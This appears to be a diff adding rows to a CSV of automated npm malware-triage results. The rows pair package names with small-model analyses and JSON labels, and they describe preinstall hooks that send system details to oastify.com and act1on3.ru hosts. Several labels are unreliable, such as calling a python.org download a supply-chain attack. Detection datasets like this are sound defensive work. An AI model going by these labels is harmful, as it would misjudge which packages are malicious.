+This package has an install hook present, which could lead to unauthorized installation or malicious behavior if not properly managed. The confidence score is 0.8, indicating high confidence in the evidence. The evidence is present in the package.json file.","{""package_name"": ""@att-bit/duc.components.cardshell"", ""version"": ""10.0.0"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"", ""details"": ""A preinstall script is found in the package. This script may lead to unauthorized installation or malicious behavior if not properly managed."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRADE94B4F""}], ""risk_vector"": [""install_hook""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:45:27.908431""}"
+@att-bit/duc.components.cardshell,10.0.1,2025-12-23T23:46:15.353158,DeepSeek-Coder-6.7B-Instruct,v2.0,5,credential_theft;install_hook;network_reconnaissance;remote_code_execution;sensitive_data_collection,"[""network_reconnaissance"", ""credential_theft"", ""sensitive_data_collection"", ""remote_code_execution"", ""install_hook""]",0.9,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+1. **Network Reconnaissance**: The preinstall script sends DNS queries and HTTP requests to the provided URLs. This could potentially be used for network reconnaissance or to gather information about the system.
+
+2. **Credential Theft**: The preinstall script sends the content of the /etc/hosts file to the provided URL. This could potentially be used to steal credentials or sensitive information.
+
+3. **Sensitive Data Collection**: The preinstall script sends the output of the `uname` command to the provided URL. This could potentially be used to gather information about the system.
+
+4. **Remote Code Execution**: The preinstall script contains the potential for remote code execution.
+
+5. **Install Hook**: The package has a preinstall script, which could potentially be used to install a backdoor or malicious code.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""network_reconnaissance"",
+      ""summary"": ""The package sends DNS queries and HTTP requests to the provided URLs during preinstall script execution."",
+      ""details"": ""The preinstall script contains commands that send DNS queries and HTTP requests to the provided URLs."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""The package sends the content of the /etc/hosts file to the provided URL during preinstall script execution."",
+      ""details"": ""The preinstall script contains a command that sends the content of the /etc/hosts file to the provided URL."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com""
+      ],
+      ""evidence_files"": [
+        ""/etc/hosts""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""sensitive_data_collection"",
+      ""summary"": ""The package sends the output of the `uname` command to the provided URL during preinstall script execution."",
+      ""details"": ""The preinstall script contains a command that sends the output of the `uname` command to the provided URL."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""remote_code_execution"",
+      ""summary"": ""The package contains the potential for remote code execution during preinstall script execution."",
+      ""details"": ""The preinstall script contains commands that could potentially be used to execute remote code."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""The package has a preinstall script that could potentially be used to install a backdoor or malicious code."",
+      ""details"": ""The package contains a preinstall script that could potentially be used to install a backdoor or malicious code."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""network_reconnaissance"",
+    ""credential_theft"",
+    ""sensitive_data_collection"",
+    ""remote_code_execution"",
+    ""install_hook""
+  ]
+}
+```
+
+Please note that this analysis is based on the provided code snippets and structural analysis context. The actual risk of these behaviors could be higher or lower depending on the context and the overall system's security posture.","{""package_name"": ""@att-bit/duc.components.cardshell"", ""version"": ""10.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""network_reconnaissance"", ""summary"": ""The package sends DNS queries and HTTP requests to the provided URLs during preinstall script execution."", ""details"": ""The preinstall script contains commands that send DNS queries and HTTP requests to the provided URLs."", ""confidence"": 0.8, ""evidence_apis"": [""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRA64AE220""}, {""category"": ""credential_theft"", ""summary"": ""The package sends the content of the /etc/hosts file to the provided URL during preinstall script execution."", ""details"": ""The preinstall script contains a command that sends the content of the /etc/hosts file to the provided URL."", ""confidence"": 0.7, ""evidence_apis"": [""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com""], ""evidence_files"": [""/etc/hosts""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR5ADAB7DF""}, {""category"": ""sensitive_data_collection"", ""summary"": ""The package sends the output of the `uname` command to the provided URL during preinstall script execution."", ""details"": ""The preinstall script contains a command that sends the output of the `uname` command to the provided URL."", ""confidence"": 0.7, ""evidence_apis"": [""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR7A47A7B1""}, {""category"": ""remote_code_execution"", ""summary"": ""The package contains the potential for remote code execution during preinstall script execution."", ""details"": ""The preinstall script contains commands that could potentially be used to execute remote code."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR4067FF37""}, {""category"": ""install_hook"", ""summary"": ""The package has a preinstall script that could potentially be used to install a backdoor or malicious code."", ""details"": ""The package contains a preinstall script that could potentially be used to install a backdoor or malicious code."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR136D6761""}], ""risk_vector"": [""network_reconnaissance"", ""credential_theft"", ""sensitive_data_collection"", ""remote_code_execution"", ""install_hook""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:46:15.352762""}"
+@aviationpast/niotest,1.0.10,2025-12-23T23:46:49.003404,DeepSeek-Coder-6.7B-Instruct,v2.0,2,dependency_injection;supply_chain_attack,"[""supply_chain_attack"", ""dependency_injection""]",0.8,"### Response:
+Based on the provided information, the package '@aviationpast/niotest' has a potential install script that downloads and installs Python 3.11.0 from the Python official website. This could potentially be a part of a supply chain attack, where the package is being used to install malicious software or dependencies.
+
+The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'. This could potentially lead to dependency confusion, where the package is using a different version of a package than intended.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""supply_chain_attack"",
+      ""summary"": ""Potential supply chain attack by downloading and installing Python 3.11.0 from the Python official website"",
+      ""details"": ""The package '@aviationpast/niotest' has an install script that downloads and installs Python 3.11.0 from the Python official website"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tgz""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""dependency_injection"",
+      ""summary"": ""Potential dependency confusion due to dependency on non-scoped packages '4equest' and 'npm'"",
+      ""details"": ""The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""supply_chain_attack"",
+    ""dependency_injection""
+  ]
+}
+```
+
+Please note that this is a preliminary analysis and the confidence scores are based on the provided information. Further analysis is required to confirm these behaviors.","{""package_name"": ""@aviationpast/niotest"", ""version"": ""1.0.10"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""supply_chain_attack"", ""summary"": ""Potential supply chain attack by downloading and installing Python 3.11.0 from the Python official website"", ""details"": ""The package '@aviationpast/niotest' has an install script that downloads and installs Python 3.11.0 from the Python official website"", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [""https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tgz""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR6A4F97E2""}, {""category"": ""dependency_injection"", ""summary"": ""Potential dependency confusion due to dependency on non-scoped packages '4equest' and 'npm'"", ""details"": ""The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'"", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRA0E2B61F""}], ""risk_vector"": [""supply_chain_attack"", ""dependency_injection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:46:49.003095""}"
+@aviationpast/niotest,1.0.14,2025-12-23T23:47:12.995566,DeepSeek-Coder-6.7B-Instruct,v2.0,3,install_hook;supply_chain_propagation;system_capability,"[""install_hook"", ""supply_chain_propagation"", ""system_capability""]",0.8,"### Response:
+Based on the provided information, the potential malicious behaviors, supply chain attacks, or security risks can be classified as follows:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install script found"",
+      ""details"": ""An install script is present in the package which could potentially be malicious."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""supply_chain_propagation"",
+      ""summary"": ""Potential dependency confusion"",
+      ""details"": ""The package '@aviationpast/niotest' depends on non-scoped package '4equest' and 'npm' which could potentially lead to supply chain attacks."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""system_capability"",
+      ""summary"": ""Potential execution of local code"",
+      ""details"": ""The package appears to install files on the user's desktop which could potentially be malicious."",
+      ""confidence"": 0.6,
+      ""evidence_files"": [
+        ""install script""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook"",
+    ""supply_chain_propagation"",
+    ""system_capability""
+  ]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. Further analysis is recommended to confirm the identified behaviors.","{""package_name"": ""@aviationpast/niotest"", ""version"": ""1.0.14"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Install script found"", ""details"": ""An install script is present in the package which could potentially be malicious."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRA040C429""}, {""category"": ""supply_chain_propagation"", ""summary"": ""Potential dependency confusion"", ""details"": ""The package '@aviationpast/niotest' depends on non-scoped package '4equest' and 'npm' which could potentially lead to supply chain attacks."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRB4465886""}, {""category"": ""system_capability"", ""summary"": ""Potential execution of local code"", ""details"": ""The package appears to install files on the user's desktop which could potentially be malicious."", ""confidence"": 0.6, ""evidence_files"": [""install script""], ""id"": ""BR5188821E""}], ""risk_vector"": [""install_hook"", ""supply_chain_propagation"", ""system_capability""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:47:12.995226""}"
+@b2bgeo/backend-api-types,13.3.7,2025-12-23T23:47:34.041029,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/backend-api-types"". The script is making an HTTP request to an external server with several headers and data, which could potentially be used for credential theft or sensitive data collection.
+
+Here is a JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""HTTP request to an external server with sensitive data"",
+      ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
+This response includes the ""credential_theft"" and ""sensitive_data_collection"" categories, along with a high confidence score of 0.8. The evidence_apis field includes the URL of the external server that the script is making the HTTP request to.","{""package_name"": ""@b2bgeo/backend-api-types"", ""version"": ""13.3.7"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""HTTP request to an external server with sensitive data"", ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."", ""confidence"": 0.8, ""evidence_apis"": [""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR4A12D369""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:47:34.040752""}"
+@b2bgeo/backend-api-types,13.3.8,2025-12-23T23:48:00.904447,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/backend-api-types"". The script is making an HTTP request to an external server with several headers and data, which could potentially be used for credential theft or sensitive data collection.
+
+Here is a JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""HTTP request to an external server with sensitive data"",
+      ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
+This response includes the ""credential_theft"" and ""sensitive_data_collection"" categories, along with a high confidence score of 0.8. The evidence_apis field includes the URL of the external server that the script is making the HTTP request to.","{""package_name"": ""@b2bgeo/backend-api-types"", ""version"": ""13.3.8"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""HTTP request to an external server with sensitive data"", ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."", ""confidence"": 0.8, ""evidence_apis"": [""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR5B972331""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:48:00.904142""}"
+@angular/core,16.2.6,2025-12-23T23:48:15.952369,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""package_name"": ""@angular/core"", ""version"": ""16.2.6"", ""label"": ""benign"", ""behaviors"": [], ""risk_vector"": [], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:48:15.952065""}"
+@aviationpast/niotest,1.0.10,2025-12-23T23:54:43.047683,DeepSeek-Coder-6.7B-Instruct,v2.0,2,dependency_injection;supply_chain_attack,"[""supply_chain_attack"", ""dependency_injection""]",0.8,"### Response:
+Based on the provided information, the package '@aviationpast/niotest' has a potential install script that downloads and installs Python 3.11.0 from the Python official website. This could potentially be a part of a supply chain attack, where the package is being used to install malicious software or dependencies.
+
+The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'. This could potentially lead to dependency confusion, where the package is using a different version of a package than intended.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""supply_chain_attack"",
+      ""summary"": ""Potential supply chain attack by downloading and installing Python 3.11.0 from the Python official website"",
+      ""details"": ""The package '@aviationpast/niotest' has an install script that downloads and installs Python 3.11.0 from the Python official website"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tgz""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""dependency_injection"",
+      ""summary"": ""Potential dependency confusion due to dependency on non-scoped packages '4equest' and 'npm'"",
+      ""details"": ""The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""supply_chain_attack"",
+    ""dependency_injection""
+  ]
+}
+```
+
+Please note that this is a preliminary analysis and the confidence scores are based on the provided information. Further analysis is required to confirm these behaviors.","{""package_name"": ""@aviationpast/niotest"", ""version"": ""1.0.10"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""supply_chain_attack"", ""summary"": ""Potential supply chain attack by downloading and installing Python 3.11.0 from the Python official website"", ""details"": ""The package '@aviationpast/niotest' has an install script that downloads and installs Python 3.11.0 from the Python official website"", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [""https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tgz""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR986D793B""}, {""category"": ""dependency_injection"", ""summary"": ""Potential dependency confusion due to dependency on non-scoped packages '4equest' and 'npm'"", ""details"": ""The package '@aviationpast/niotest' depends on non-scoped packages '4equest' and 'npm'"", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR914087FF""}], ""risk_vector"": [""supply_chain_attack"", ""dependency_injection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:54:43.047329""}"
+@aviationpast/niotest,1.0.14,2025-12-23T23:55:06.786503,DeepSeek-Coder-6.7B-Instruct,v2.0,3,install_hook;supply_chain_propagation;system_capability,"[""install_hook"", ""supply_chain_propagation"", ""system_capability""]",0.8,"### Response:
+Based on the provided information, the potential malicious behaviors, supply chain attacks, or security risks can be classified as follows:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install script found"",
+      ""details"": ""An install script is present in the package which could potentially be malicious."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""supply_chain_propagation"",
+      ""summary"": ""Potential dependency confusion"",
+      ""details"": ""The package '@aviationpast/niotest' depends on non-scoped package '4equest' and 'npm' which could potentially lead to supply chain attacks."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""system_capability"",
+      ""summary"": ""Potential execution of local code"",
+      ""details"": ""The package appears to install files on the user's desktop which could potentially be malicious."",
+      ""confidence"": 0.6,
+      ""evidence_files"": [
+        ""install script""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook"",
+    ""supply_chain_propagation"",
+    ""system_capability""
+  ]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. Further analysis is recommended to confirm the identified behaviors.","{""package_name"": ""@aviationpast/niotest"", ""version"": ""1.0.14"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Install script found"", ""details"": ""An install script is present in the package which could potentially be malicious."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRF0F102C6""}, {""category"": ""supply_chain_propagation"", ""summary"": ""Potential dependency confusion"", ""details"": ""The package '@aviationpast/niotest' depends on non-scoped package '4equest' and 'npm' which could potentially lead to supply chain attacks."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BR5E3830D9""}, {""category"": ""system_capability"", ""summary"": ""Potential execution of local code"", ""details"": ""The package appears to install files on the user's desktop which could potentially be malicious."", ""confidence"": 0.6, ""evidence_files"": [""install script""], ""id"": ""BRAACD71F9""}], ""risk_vector"": [""install_hook"", ""supply_chain_propagation"", ""system_capability""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:55:06.786170""}"
+@b2bgeo/backend-api-types,13.3.7,2025-12-23T23:55:27.833726,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/backend-api-types"". The script is making an HTTP request to an external server with several headers and data, which could potentially be used for credential theft or sensitive data collection.
+
+Here is a JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""HTTP request to an external server with sensitive data"",
+      ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
+This response includes the ""credential_theft"" and ""sensitive_data_collection"" categories, along with a high confidence score of 0.8. The evidence_apis field includes the URL of the external server that the script is making the HTTP request to.","{""package_name"": ""@b2bgeo/backend-api-types"", ""version"": ""13.3.7"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""HTTP request to an external server with sensitive data"", ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."", ""confidence"": 0.8, ""evidence_apis"": [""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR0B945528""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:55:27.833397""}"
+@b2bgeo/backend-api-types,13.3.8,2025-12-23T23:55:54.132528,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/backend-api-types"". The script is making an HTTP request to an external server with several headers and data, which could potentially be used for credential theft or sensitive data collection.
+
+Here is a JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""HTTP request to an external server with sensitive data"",
+      ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
+This response includes the ""credential_theft"" and ""sensitive_data_collection"" categories, along with a high confidence score of 0.8. The evidence_apis field includes the URL of the external server that the script is making the HTTP request to.","{""package_name"": ""@b2bgeo/backend-api-types"", ""version"": ""13.3.8"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""HTTP request to an external server with sensitive data"", ""details"": ""The preinstall script makes an HTTP request to an external server with several headers and data, potentially used for credential theft or sensitive data collection."", ""confidence"": 0.8, ""evidence_apis"": [""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR4050E225""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:55:54.132224""}"
+@b2bgeo/certs,13.3.7,2025-12-23T23:56:18.409946,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message. This could potentially be a form of credential theft or sensitive data collection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""The package has a preinstall script that sends HTTP requests with sensitive information"",
+      ""details"": ""The package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
+This analysis is based on the provided code snippets and structural analysis context. The confidence score is 0.8 as it is based on direct evidence of the preinstall script sending HTTP requests with sensitive information. The risk vector includes ""credential_theft"" and ""sensitive_data_collection"" as these are the potential malicious behaviors identified.","{""package_name"": ""@b2bgeo/certs"", ""version"": ""13.3.7"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""The package has a preinstall script that sends HTTP requests with sensitive information"", ""details"": ""The package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message"", ""confidence"": 0.8, ""evidence_apis"": [""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR1265CC09""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:56:18.409669""}"
+@b2bgeo/certs,13.3.8,2025-12-23T23:56:41.303505,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft"", ""sensitive_data_collection""]",0.8,"### Response:
+Based on the provided information, the package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message. This could potentially be a form of credential theft or sensitive data collection.
+
+Here is a JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""The package has a preinstall script that sends HTTP requests with sensitive information"",
+      ""details"": ""The package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message"",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection""
+  ]
+}
+```
+
